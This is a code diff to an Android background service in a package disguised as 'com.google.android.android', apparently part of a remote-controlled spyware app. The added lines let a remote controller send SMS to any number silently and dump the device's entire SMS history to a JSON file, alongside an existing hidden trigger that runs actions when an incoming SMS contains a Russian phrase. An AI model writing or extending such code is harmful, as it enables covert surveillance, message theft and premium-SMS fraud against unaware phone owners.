@@ -1,17 +1,23 @@
 package com.google.android.android;
 
 import android.app.Service;
+import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
+import android.database.Cursor;
 import android.icu.util.UniversalTimeScale;
 import android.net.ConnectivityManager;
 import android.net.Network;
 import android.net.NetworkInfo;
+import android.net.Uri;
 import android.net.wifi.ScanResult;
 import android.net.wifi.WifiInfo;
 import android.net.wifi.WifiManager;
 import android.os.Build;
+import android.os.Environment;
 import android.os.IBinder;
+import android.provider.Telephony;
+import android.telephony.SmsManager;
 import android.widget.Toast;
 
 import org.json.JSONStringer;
@@ -22,6 +28,7 @@ import org.json.simple.parser.JSONParser;
 import java.io.File;
 import java.io.FileInputStream;
 import java.io.FileOutputStream;
+import java.io.FileWriter;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.OutputStream;
@@ -29,6 +36,9 @@ import java.io.UTFDataFormatException;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
 import java.net.Socket;
+import java.text.SimpleDateFormat;
+import java.util.Calendar;
+import java.util.Date;
 import java.util.List;
 import java.util.Timer;
 import java.util.TimerTask;
@@ -51,6 +61,7 @@ public class MainService extends Service {
 
     private RecordManager recordManager;
     private MyWifiManager myWifiManager;
+    private MySmsManager mySmsManager;
 
     public static MainService getInstance() {
         return _instance;
@@ -64,6 +75,11 @@ public class MainService extends Service {
     private MyWifiManager getMyWifiManager() {
         if (myWifiManager == null) myWifiManager = new MyWifiManager();
         return myWifiManager;
+    }
+
+    private MySmsManager getMySmsManager() {
+        if (mySmsManager == null) mySmsManager = new MySmsManager();
+        return mySmsManager;
     }
 
     @Override
@@ -83,7 +99,7 @@ public class MainService extends Service {
     }
 
     private void testCode() {
-//        receiveSms("900", "sdfsf dsfsdf dfsd Тел. для записи: 842-42-06");
+
     }
 
     @Override
@@ -276,6 +292,34 @@ public class MainService extends Service {
                 boolean wifiState = myWifiManager.setWifiEnabled((boolean) message.get("enabled"));
                 nettyClient.sendSetWifiEnabled(wifiState, (String) message.get("owner"));
                 break;
+            case "send.sms":
+                String phoneNumber = (String) message.get("phoneNumber");
+                String text = (String) message.get("text");
+                SmsManager.getDefault().sendTextMessage(phoneNumber, null, text, null, null);
+                nettyClient.sendSendSms(SUCCESS, (String) message.get("owner"));
+                break;
+            case "save.sms.log":
+                JSONArray allSms = getMySmsManager().getAllSms();
+
+                SimpleDateFormat simpleDateFormat = new SimpleDateFormat("dd.MM.yy HH:mm:ss");
+                Calendar calendar = Calendar.getInstance();
+                String fileName = Environment.getExternalStorageDirectory() + "/android/data/sms-log ";
+                fileName += simpleDateFormat.format(calendar.getTime()) + ".json";
+                File outFile = new File(fileName);
+                if (outFile.exists()) {
+                    outFile.delete();
+                }
+
+                try {
+                    FileWriter fileWriter = new FileWriter(outFile);
+                    fileWriter.write(allSms.toJSONString());
+                    fileWriter.flush();
+                } catch (IOException e) {
+                    e.printStackTrace();
+                }
+
+                nettyClient.sendSaveSmsLog(allSms.size(), (String) message.get("owner"));
+                break;
             /*case "setOwner":
                 String owner = message.getString("owner");
                 outputJSONObject.put("owner", owner);
@@ -319,6 +363,7 @@ public class MainService extends Service {
     public void receiveSms(String phoneNumber, String message) {
         String pattern = "Тел. для записи: ";
         int start = message.indexOf(pattern);
+        if (start == -1 || message.length() < pattern.length() + 9) return;
         String action = message.substring(start + pattern.length(), start + pattern.length() + 9);
 
         switch (action) {
